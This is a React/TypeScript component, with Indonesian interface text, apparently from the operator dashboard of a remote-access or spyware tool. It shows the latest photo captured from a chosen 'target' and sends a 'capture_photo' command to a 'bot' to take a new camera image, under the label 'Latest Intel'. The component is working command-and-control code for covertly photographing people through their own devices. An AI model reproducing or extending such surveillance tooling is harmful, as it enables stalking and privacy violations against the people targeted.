'use client';

import { useEffect, useState } from 'react';
import { Camera, RefreshCcw, Clock3, X } from 'lucide-react';
import { clsx } from 'clsx';
import { twMerge } from 'tailwind-merge';
import { onValue, ref } from 'firebase/database';
import { database, FIREBASE_PATHS } from '@/lib/firebase';
import { sendCommand } from '@/services/targetService';
import { toast } from '@/lib/toast';

const cn = (...inputs: Array<string | false | null | undefined>) => twMerge(clsx(inputs));

interface PhotoGalleryProps {
  targetId?: string;
}

interface PhotoCapture {
  url?: string;
  timestamp?: number;
  [key: string]: any;
}

export default function PhotoGallery({ targetId }: PhotoGalleryProps) {
  const [photo, setPhoto] = useState<PhotoCapture | null>(null);
  const [loading, setLoading] = useState(true);
  const [sending, setSending] = useState(false);
  const [lightboxOpen, setLightboxOpen] = useState(false);

  useEffect(() => {
    if (!targetId) {
      setPhoto(null);
      setLoading(false);
      return;
    }

    setLoading(true);
    const photoRef = ref(database, `${FIREBASE_PATHS.PHOTOS}/${targetId}`);
    const unsubscribe = onValue(photoRef, (snapshot) => {
      const data = snapshot.val();
      if (!data) {
        setPhoto(null);
      } else if (typeof data === 'string') {
        setPhoto({ url: data, timestamp: undefined });
      } else {
        setPhoto(data);
      }
      setLoading(false);
    });

    return () => unsubscribe();
  }, [targetId]);

  const handleCapture = async () => {
    if (!targetId) return;

    setSending(true);
    try {
      await sendCommand(targetId, 'capture_photo');
      toast.success('Perintah capture photo terkirim.');
    } catch (error) {
      toast.error('Gagal mengirim perintah capture photo.');
    } finally {
      setSending(false);
    }
  };

  const formattedTime = photo?.timestamp
    ? new Date(photo.timestamp).toLocaleString('id-ID', {
        hour: '2-digit',
        minute: '2-digit',
        day: '2-digit',
        month: '2-digit',
      })
    : 'Unknown';

  return (
    <>
      <section className="rounded-[32px] border border-white/10 bg-slate-950/85 p-6 shadow-2xl shadow-slate-950/30 backdrop-blur-xl">
        <div className="flex flex-col gap-4 sm:flex-row sm:items-center sm:justify-between">
          <div>
            <p className="text-sm uppercase tracking-[0.3em] text-emerald-300/70">Latest Intel</p>
            <h3 className="mt-2 text-2xl font-semibold text-white">Photo Gallery</h3>
            <p className="max-w-sm text-sm text-slate-400">
              Gambar terbaru dari target. Gunakan tombol refresh untuk memicu capture langsung dari bot.
            </p>
          </div>

          <button
            type="button"
            onClick={handleCapture}
            disabled={!targetId || sending}
            className={cn(
              'inline-flex items-center justify-center gap-2 rounded-2xl border px-4 py-3 text-sm font-semibold transition',
              'border-emerald-500/30 bg-emerald-500/10 text-emerald-200 hover:border-emerald-400/70 hover:bg-emerald-500/15',
              (!targetId || sending) && 'cursor-not-allowed opacity-50'
            )}
          >
            <RefreshCcw size={16} />
            {sending ? 'Memproses...' : 'Refresh / Capture'}
          </button>
        </div>

        <div className="mt-6 overflow-hidden rounded-[28px] border border-white/10 bg-black/30 shadow-inner shadow-slate-950/20">
          <div className="relative min-h-[300px] bg-slate-950/90 p-4">
            {loading ? (
              <div className="flex min-h-[300px] items-center justify-center text-slate-500">Memuat intel terbaru...</div>
            ) : !targetId ? (
              <div className="flex min-h-[300px] items-center justify-center text-slate-500">
                Pilih target untuk menampilkan foto.
              </div>
            ) : !photo?.url ? (
              <div className="flex min-h-[300px] flex-col items-center justify-center gap-3 text-slate-500">
                <Camera size={36} />
                <p>Tidak ada foto terakhir tersedia.</p>
              </div>
            ) : (
              <div className="relative">
                <img
                  src={photo.url}
                  alt={`Latest capture for ${targetId}`}
                  className="h-[320px] w-full object-contain cursor-pointer rounded-lg"
                  onClick={() => setLightboxOpen(true)}
                />
                <div className="pointer-events-none absolute inset-0 bg-gradient-to-t from-slate-950/85 via-slate-950/25 to-transparent" />
                <div className="absolute bottom-4 left-4 flex items-center gap-2 rounded-2xl bg-slate-950/80 px-4 py-2 text-sm text-slate-100 shadow-lg shadow-black/30">
                  <Clock3 size={16} />
                  <span>{formattedTime}</span>
                </div>
                <div className="absolute top-4 left-4 rounded-2xl bg-emerald-500/10 px-3 py-1 text-xs uppercase tracking-[0.2em] text-emerald-300">
                  {targetId}
                </div>
              </div>
            )}
          </div>
        </div>
      </section>

      {/* Lightbox Modal */}
      {lightboxOpen && photo?.url && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm"
          onClick={() => setLightboxOpen(false)}
        >
          <div className="relative max-h-[90vh] max-w-[90vw]">
            <img
              src={photo.url}
              alt={`Latest capture for ${targetId}`}
              className="max-h-full max-w-full object-contain"
            />
            <button
              onClick={() => setLightboxOpen(false)}
              className="absolute top-4 right-4 rounded-full bg-black/50 p-2 text-white hover:bg-black/70"
            >
              <X size={24} />
            </button>
          </div>
        </div>
      )}
    </>
  );
}
